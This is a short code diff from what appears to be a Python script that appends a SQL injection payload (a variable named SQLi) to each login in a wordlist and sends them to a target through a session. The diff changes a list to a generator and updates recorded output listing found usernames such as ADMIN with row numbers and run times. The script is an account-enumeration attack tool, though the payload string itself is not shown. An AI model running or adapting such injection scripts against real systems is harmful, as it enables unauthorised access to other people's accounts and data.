@@ -26,7 +26,7 @@ def func(session, login, row):
 with open(f"{FILE_NAME}.txt") as f:
     logins = f.readlines()
 
-logins = [login.strip() + SQLi for login in logins]
+logins = (login.strip() + SQLi for login in logins)
 
 start = time.time()
 
@@ -62,5 +62,5 @@ user: SMITHY row: 74374
 user: ADMIN row: 76288
 user: PABLO row: 111320
 user: gordonb row: 166548
-time: 944.25 c
+time: 2819.72 c
 """
